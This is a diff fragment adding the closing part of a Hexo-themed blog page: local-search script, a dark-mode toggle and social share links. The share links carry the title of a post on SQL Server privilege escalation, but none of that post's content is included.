+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E4%BD%9C%E4%B8%9A%E5%8A%AB%E6%8C%81SQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%AD%E6%8D%AE%E6%9D%A5%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F2024%2F%25E5%2588%25A9%25E7%2594%25A8%25E4%25BB%25A3%25E7%2590%2586%25E4%25BD%259C%25E4%25B8%259A%25E5%258A%25AB%25E6%258C%2581SQL%25E6%259C%258D%25E5%258A%25A1%25E5%2599%25A8%25E5%2587%25AD%25E6%258D%25AE%25E6%259D%25A5%25E5%25AE%259E%25E7%258E%25B0%25E6%259D%2583%25E9%2599%2590%25E6%258F%2590%25E5%258D%2587%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/2024/%E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E4%BD%9C%E4%B8%9A%E5%8A%AB%E6%8C%81SQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%AD%E6%8D%AE%E6%9D%A5%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
